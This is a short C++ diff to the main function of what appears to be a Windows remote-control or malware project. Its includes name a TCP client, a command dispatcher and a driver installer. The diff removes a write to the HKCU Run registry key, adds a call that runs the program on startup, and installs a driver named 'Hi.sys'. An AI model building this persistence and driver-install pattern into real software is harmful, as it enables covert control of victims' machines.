@@ -7,18 +7,13 @@
 
 #include "command/CommandDispatcher.h"
 #include "utils/builders.h"
+#include "utils/factory.h"
 #include "networking/WinsockTCPClient.h"
 #include "methods/driver/Installer.h"
 
-#include "utils/registry/RegistryEditor.h"
-
 int main()
 {
-    utils::registry::RegistryEditor editor;
-
-    editor.SetValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"val", L"0");
-
-    return 0;
+    utils::factory::execute_on_startup();
 
     methods::driver::Installer installer("Hi.sys");
 
